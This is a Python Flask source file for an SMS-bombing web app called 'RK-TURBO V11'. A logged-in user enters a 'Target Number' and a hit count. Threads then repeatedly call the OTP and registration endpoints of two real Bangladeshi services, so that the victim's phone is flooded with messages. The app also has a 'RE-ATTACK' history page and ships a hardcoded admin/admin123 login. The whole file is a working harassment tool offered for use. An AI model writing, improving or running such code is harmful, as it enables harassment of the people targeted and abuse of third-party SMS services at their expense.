import requests
import threading
import os
import time
import sqlite3
import random
import json
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [FEATURE: BST BD TIME ZONE] ----------
def get_bd_time():
    return datetime.now(timezone(timedelta(hours=6)))

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v11_pro.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- [CORE TURBO ENGINE] ----------
active_sessions = {}

def send_request(phone):
    api_list = [
        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}",
        "https://redx.com.bd/api/v1/user/otp?phone={}"
    ]
    try:
        res = requests.get(random.choice(api_list).format(phone), timeout=6)
        return res.status_code == 200
    except: return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    with ThreadPoolExecutor(max_workers=5) as executor:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
            if curr['status'] == 'Running':
                now = get_bd_time()
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                future = executor.submit(send_request, phone)
                if future.result(): active_sessions[key]['success'] += 1
                else: active_sessions[key]['fail'] += 1
                active_sessions[key]['total'] += 1
                if active_sessions[key]['total'] > 1:
                    avg_speed = elapsed.total_seconds() / active_sessions[key]['total']
                    rem = active_sessions[key]['limit'] - active_sessions[key]['total']
                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg_speed * rem)))
                time.sleep(0.15)
            else: time.sleep(1)

    stop_dt = get_bd_time()
    s = active_sessions.get(key)
    if s and s['status'] != 'Paused':
        with get_db() as conn:
            conn.execute('''INSERT INTO history 
                (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) 
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''',
                (username, phone, s['success'], s['fail'], s['total'], s['limit'], "Completed", 
                 s['start_time'], stop_dt.strftime("%I:%M %p"), s.get('running_time','0:00:00'), start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- [DUAL-COLOUR CYBER UI] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-V11 ULTIMATE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --blue: #00ccff; --bg: #010101; --card: #0a0a0a; --red: #ff0055; --gold: #ffcc00; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; }
        
        /* NAVBAR & MENU */
        .nav { background: #000; padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; }
        .logo { font-family: 'Orbitron'; font-weight: 900; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .three-dot { cursor: pointer; display: flex; flex-direction: column; gap: 3px; }
        .dot { height: 4px; width: 4px; background: var(--blue); border-radius: 50%; box-shadow: 0 0 5px var(--blue); }
        
        .menu-dropdown { 
            position: absolute; right: 20px; top: 60px; background: var(--card); border: 1px solid var(--blue); 
            border-radius: 10px; width: 220px; display: none; z-index: 2000; 
        }
        .menu-dropdown a { display: block; padding: 12px 20px; color: #fff; text-decoration: none; font-family: 'Orbitron'; font-size: 10px; border-bottom: 1px solid #1a1a1a; transition: 0.3s; }
        .menu-dropdown a:hover { background: linear-gradient(90deg, var(--neon), var(--blue)); color: #000; }

        /* RGB FRAME */
        .container { padding: 20px; max-width: 500px; margin: auto; }
        .monitor-frame {
            position: relative; background: #000; border-radius: 15px; padding: 3px; overflow: hidden; margin-bottom: 20px; box-shadow: 0 0 20px rgba(0,255,204,0.2);
        }
        .monitor-frame::before {
            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(var(--neon), var(--blue), var(--neon));
            animation: rotate 4s linear infinite;
        }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .monitor-content { position: relative; background: var(--card); border-radius: 12px; padding: 18px; z-index: 2; }

        /* MULTI-COLOUR TEXTS */
        .txt-neon { color: var(--neon); }
        .txt-blue { color: var(--blue); }
        .txt-gold { color: var(--gold); }
        
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .info-box { background: rgba(255,255,255,0.02); border: 1px solid #222; padding: 10px; border-radius: 8px; text-align: center; }
        .info-box span { display: block; font-size: 9px; color: #777; font-weight: bold; text-transform: uppercase; }
        .info-box b { font-family: 'Orbitron'; font-size: 1rem; }

        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 10px; font-family: 'Orbitron'; box-sizing: border-box; outline: none; border-left: 3px solid var(--blue); }
        .btn-turbo { background: linear-gradient(90deg, var(--neon), var(--blue)); color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; transition: 0.3s; }
        .btn-turbo:hover { letter-spacing: 1px; box-shadow: 0 0 15px var(--blue); }

        .btn-ctrl { flex: 1; padding: 10px; border: none; border-radius: 8px; font-family: 'Orbitron'; font-size: 9px; font-weight: 900; cursor: pointer; }
        .bg-pause { background: var(--gold); color: #000; }
        .bg-stop { background: var(--red); color: #fff; }

        /* HISTORY STYLES */
        .hist-item { cursor: pointer; transition: 0.3s; border-bottom: 1px solid #111; padding: 12px 0; }
        .hist-item:hover { background: rgba(0, 204, 255, 0.05); }
        .details-panel { display: none; background: #050505; padding: 15px; border-radius: 8px; margin-top: 10px; border: 1px dashed var(--blue); }
        .re-attack-btn { background: var(--neon); color: #000; border: none; padding: 8px 15px; border-radius: 5px; font-family: 'Orbitron'; font-size: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body onclick="document.getElementById('mBox').style.display='none'">
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>

    <nav class="nav">
        <div class="logo">RK-TURBO V11</div>
        <div class="three-dot" onclick="event.stopPropagation(); document.getElementById('mBox').style.display='block'">
            <span class="dot"></span><span class="dot"></span><span class="dot"></span>
        </div>
    </nav>

    <div class="menu-dropdown" id="mBox">
        <a href="/history" class="txt-neon">1. 📂 ALL HISTORY</a>
        <a href="/dashboard" class="txt-blue">2. 🚀 ATTACK CENTER</a>
        <a href="/profile" class="txt-gold">3. 👤 PROFILE</a>
        <a href="/logout" style="color:var(--red)">4. 🚪 LOGOUT</a>
    </div>

    <div class="container">[CONTENT]</div>

    <script>
        function toggleDetails(id) {
            let el = document.getElementById('det-'+id);
            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
        }
        function playStart() { document.getElementById('snd_start').play(); }
        function sync() {
            let area = document.getElementById('live-engine');
            if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k];
                    let p = (s.total/s.limit)*100;
                    html += `
                    <div class="monitor-frame">
                        <div class="monitor-content">
                            <div style="display:flex; justify-content:space-between; align-items:center;">
                                <b class="txt-blue" style="font-family:'Orbitron';">🛰 TARGET: ${s.phone}</b>
                                <span style="background:${s.status==='Running'?'var(--neon)':'var(--gold)'}; color:#000; padding:2px 8px; border-radius:4px; font-size:9px; font-weight:bold;">${s.status}</span>
                            </div>
                            <div style="height:4px; background:#111; border-radius:2px; margin:15px 0;"><div style="height:100%; background:linear-gradient(90deg, var(--neon), var(--blue)); width:${p}%"></div></div>
                            <div class="info-grid">
                                <div class="info-box"><span>SUCCESS</span><b class="txt-neon">${s.success}</b></div>
                                <div class="info-box"><span>FAILED</span><b style="color:var(--red)">${s.fail}</b></div>
                                <div class="info-box"><span>ETA</span><b class="txt-gold">${s.eta}</b></div>
                                <div class="info-box"><span>ELAPSED</span><b class="txt-blue">${s.running_time}</b></div>
                            </div>
                            <div style="display:flex; gap:10px; margin-top:15px;">
                                <button class="btn-ctrl bg-pause" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">${s.status==='Running'?'PAUSE':'RESUME'}</button>
                                <button class="btn-ctrl bg-stop" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                            </div>
                        </div>
                    </div>`;
                }
                area.innerHTML = html;
            });
        }
        setInterval(sync, 1500);
    </script>
</body>
</html>
'''

# ---------- [ROUTES & SMART LOGIC] ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3 class="txt-neon">SECURE LOGIN</h3><form method="POST"><input name="u" placeholder="Admin Identity"><input name="p" type="password" placeholder="Pass-Key"><button class="btn-turbo">INITIALIZE SYSTEM</button></form></div></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="monitor-frame">
            <div class="monitor-content">
                <h3 class="txt-blue" style="margin-top:0; font-family:'Orbitron';">🚀 ATTACK INTERFACE</h3>
                <form action="/api/start" onsubmit="playStart()">
                    <input name="num" placeholder="Target Number" required>
                    <input name="amt" type="number" placeholder="Hit Amount" required>
                    <button class="btn-turbo">LAUNCH ATTACK</button>
                </form>
            </div>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        # Grouping by Phone Number
        phones = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_ok FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    
    html = '<h3 class="txt-neon" style="font-family:Orbitron;">📂 GROUPED HISTORY</h3>'
    for p in phones:
        with get_db() as conn:
            details = conn.execute("SELECT * FROM history WHERE phone=? ORDER BY id DESC", (p['phone'],)).fetchall()
        
        detail_html = ""
        for d in details:
            detail_html += f'''
            <div style="border-left: 2px solid var(--blue); padding-left: 10px; margin-bottom: 10px; font-size: 11px;">
                <span class="txt-gold">Time:</span> {d['start_time']} | <span class="txt-neon">Success:</span> {d['success']} | <span class="txt-blue">Duration:</span> {d['duration']}<br>
                <span style="color:#666">Status: {d['status']} | Date: {d['date_str']}</span>
                <br>
                <button class="re-attack-btn" onclick="location.href='/api/start?num={d['phone']}&amt={d['limit_amt']}'">RE-ATTACK ({d['limit_amt']})</button>
            </div>'''

        html += f'''
        <div class="monitor-frame">
            <div class="monitor-content">
                <div class="hist-item" onclick="toggleDetails('{p['phone']}')">
                    <b class="txt-blue" style="font-size:1.1rem;">📱 {p['phone']}</b>
                    <div style="display:flex; justify-content:space-between; font-size:10px; margin-top:5px;">
                        <span class="txt-neon">TOTAL SUCCESS: {p['total_ok']}</span>
                        <span class="txt-gold">MISSIONS: {p['sessions']}</span>
                    </div>
                </div>
                <div class="details-panel" id="det-{p['phone']}">
                    {detail_html}
                </div>
            </div>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = get_bd_time()
        active_sessions[f"{u}_{num}"] = {'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': 'Calculating...'}
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    return jsonify({k: v for k, v in active_sessions.items() if k.startswith(u)})

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

@app.route('/profile')
def profile():
    return render_template_string(LAYOUT.replace('[CONTENT]', f'<div class="monitor-frame"><div class="monitor-content"><h3>👤 PROFILE</h3><b class="txt-blue">User ID:</b> {session.get("user")}<br><b class="txt-neon">Region:</b> Bangladesh<br><b class="txt-gold">Status:</b> Ultra VIP</div></div>'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
